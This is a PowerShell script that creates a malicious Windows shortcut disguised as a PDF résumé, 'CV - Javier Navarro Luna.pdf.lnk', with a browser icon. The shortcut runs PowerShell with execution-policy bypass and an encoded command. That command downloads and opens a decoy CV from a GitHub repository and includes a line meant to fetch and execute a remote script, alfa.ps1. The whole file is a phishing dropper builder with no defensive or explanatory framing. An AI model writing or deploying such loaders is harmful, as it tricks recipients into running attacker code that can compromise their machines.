$WshShell = New-Object -ComObject WScript.Shell
if ($null -eq $WshShell) { Write-Error "WshShell es NULL"; return }

$Shortcut = $WshShell.CreateShortcut("$pwd\CV - Javier Navarro Luna.pdf.lnk")
if ($null -eq $Shortcut) { Write-Error "Shortcut es NULL"; return }

$command = @"
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/mikranscn/PruebaEscritorio/main/CV.pdf', '.\CV - Javier Navarro Luna.pdf');
Start-Process ".\CV - Javier Navarro Luna.pdf";
echo I E X (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mikranscn/PruebaEscritorio/main/alfa.ps1')
"@

$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
if ($null -eq $encoded) { Write-Error "Encoded es NULL"; return }

$Shortcut.TargetPath = "C:\Windows\System32\cmd.exe"
$Shortcut.Arguments = "/C powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded"
$Shortcut.IconLocation = "%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe,11"
$Shortcut.Save()

